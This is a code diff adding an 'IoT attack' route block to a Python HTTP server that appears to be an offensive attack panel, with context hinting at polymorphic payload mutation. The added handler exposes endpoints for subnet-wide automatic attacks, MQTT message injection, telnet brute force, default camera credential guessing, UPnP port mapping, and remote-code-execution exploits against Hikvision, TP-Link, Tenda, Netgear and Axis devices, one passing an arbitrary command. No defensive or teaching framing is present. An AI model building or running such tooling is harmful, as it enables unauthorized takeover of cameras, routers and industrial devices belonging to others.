@@ -92,6 +92,12 @@ try:
 except ImportError:
     _WIFI_OK = False
 
+try:
+    import iot_attack as _iot_mod
+    _IOT_OK = True
+except ImportError:
+    _IOT_OK = False
+
 # ── Per-request polymorphic mutation cache ────────────────────────────────────
 _POLY_CACHE: dict = {}          # fname -> (mtime, mutated_bytes)
 _POLY_LOCK  = threading.Lock()
@@ -1440,6 +1446,91 @@ class H(BaseHTTPRequestHandler):
                     self._send(f"[!] WiFi error: {e}", "text/plain")
             else:
                 self._send("wifi_attack module not available", "text/plain")
+            return
+
+        # ── IoT attack endpoints ──────────────────────────────────────────────
+        if path.startswith("/iot"):
+            sub = path[4:].lstrip("/")
+            ip      = qs.get("ip",      [""])[0]
+            subnet  = qs.get("subnet",  ["192.168.1.0/24"])[0]
+            port    = int(qs.get("port",["0"])[0]) or None
+            topic   = qs.get("topic",   ["#"])[0]
+            payload = qs.get("payload", ["ON"])[0]
+            dur     = int(qs.get("duration", ["30"])[0])
+            cmd     = qs.get("cmd",     ["id"])[0]
+            if not sub or sub == "help":
+                self._send(
+                    "IoT Attack Endpoints:\n"
+                    "  /iot/scan?subnet=192.168.1.0/24\n"
+                    "  /iot/auto?subnet=192.168.1.0/24\n"
+                    "  /iot/ssdp\n"
+                    "  /iot/mdns?duration=15\n"
+                    "  /iot/rtsp?ip=X&port=554\n"
+                    "  /iot/mqtt?ip=X          (dump all topics + inject)\n"
+                    "  /iot/mqtt_inject?ip=X&topic=cmnd/dev/POWER&payload=ON\n"
+                    "  /iot/modbus?ip=X\n"
+                    "  /iot/coap?ip=X\n"
+                    "  /iot/ros?ip=X\n"
+                    "  /iot/hue?ip=X           (Philips Hue bridge)\n"
+                    "  /iot/lifx               (LIFX broadcast)\n"
+                    "  /iot/hikvision_rce?ip=X&cmd=id\n"
+                    "  /iot/tplink_rce?ip=X\n"
+                    "  /iot/tenda_rce?ip=X\n"
+                    "  /iot/dahua_bypass?ip=X\n"
+                    "  /iot/telnet_brute?ip=X\n"
+                    "  /iot/cam_creds?ip=X\n"
+                    "  /iot/upnp_map?ip=X&ext_port=8888&int_ip=Y&int_port=8888\n",
+                    "text/plain"
+                )
+                return
+            if _IOT_OK:
+                try:
+                    action_map = {
+                        "scan":          lambda: _iot_mod.scan_subnet(subnet),
+                        "ssdp":          lambda: _iot_mod.ssdp_scan(),
+                        "mdns":          lambda: _iot_mod.mdns_scan(duration=dur),
+                        "coap":          lambda: _iot_mod.coap_scan(ip, port=port or 5683),
+                        "modbus":        lambda: _iot_mod.modbus_scan(ip, port=port or 502),
+                        "ros":           lambda: _iot_mod.ros_scan(ip),
+                        "ros2":          lambda: _iot_mod.ros2_scan(ip),
+                        "hue":           lambda: _iot_mod.philips_hue_attack(ip),
+                        "lifx":          lambda: _iot_mod.lifx_attack(),
+                        "tuya":          lambda: _iot_mod.tuya_local_attack(ip, port=port or 6668),
+                        "rtsp":          lambda: _iot_mod.rtsp_brute(ip, port=port or 554),
+                        "onvif":         lambda: _iot_mod.onvif_probe(ip, port=port or 80),
+                        "mqtt":          lambda: _iot_mod.mqtt_attack(ip, port=port or 1883),
+                        "mqtt_inject":   lambda: _iot_mod.mqtt_inject(ip, port=port or 1883, topic=topic, payload=payload),
+                        "mqtt_dump":     lambda: _iot_mod.mqtt_dump_topics(ip, port=port or 1883, duration=dur),
+                        "cam_creds":     lambda: _iot_mod.camera_default_creds(ip, port=port or 80),
+                        "telnet_brute":  lambda: _iot_mod.telnet_brute(ip, port=port or 23),
+                        "hikvision_rce": lambda: _iot_mod.cve_hikvision_rce(ip, port=port or 80, cmd=cmd),
+                        "tplink_rce":    lambda: _iot_mod.cve_tplink_rce(ip, port=port or 80),
+                        "tenda_rce":     lambda: _iot_mod.cve_tenda_rce(ip, port=port or 80),
+                        "netgear_rce":   lambda: _iot_mod.cve_netgear_rce(ip, port=port or 80),
+                        "axis_rce":      lambda: _iot_mod.cve_axis_rce(ip, port=port or 80),
+                        "dahua_bypass":  lambda: _iot_mod.cve_dahua_auth_bypass(ip, port=port or 37777),
+                        "upnp_map":      lambda: _iot_mod.upnp_port_map(
+                            ip,
+                            int(qs.get("ext_port",["8888"])[0]),
+                            qs.get("int_ip",["127.0.0.1"])[0],
+                            int(qs.get("int_port",["8888"])[0])
+                        ),
+                    }
+                    if sub == "auto":
+                        threading.Thread(
+                            target=_iot_mod.auto_attack,
+                            kwargs={"subnet": subnet}, daemon=True
+                        ).start()
+                        self._send(f"[*] IoT auto-attack started on {subnet}", "text/plain")
+                    elif sub in action_map:
+                        result = action_map[sub]()
+                        self._send(str(result)[:8000], "text/plain")
+                    else:
+                        self._send(f"Unknown IoT action: {sub}", "text/plain")
+                except Exception as e:
+                    self._send(f"[!] IoT error: {e}", "text/plain")
+            else:
+                self._send("iot_attack module not available", "text/plain")
             return
 
         # ── Exploit module index ──────────────────────────────────────────────
